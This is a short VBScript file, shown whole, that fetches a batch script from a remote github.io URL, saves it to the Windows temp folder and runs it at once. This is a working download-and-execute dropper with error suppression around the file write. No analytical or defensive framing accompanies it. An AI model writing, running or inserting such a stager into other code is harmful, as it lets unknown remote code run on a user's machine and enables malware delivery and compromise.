Dim url, localFile, http, stream, shell, fso

url = "https://do-not-download-again.github.io/script.bat"

Set fso = CreateObject("Scripting.FileSystemObject")
localFile = fso.GetSpecialFolder(2).Path & "\downloaded_script.bat"
    
Set http = CreateObject("MSXML2.XMLHTTP")
Set shell = CreateObject("WScript.Shell")

http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    On Error Resume Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2 
    stream.Charset = "us-ascii"
    stream.Open
    stream.WriteText http.responseText
    stream.SaveToFile localFile, 2
    stream.Close
    On Error GoTo 0
        
    shell.Run Chr(34) & localFile & Chr(34), 1, False
Else
    MsgBox "Download failed: HTTP " & http.Status
End If
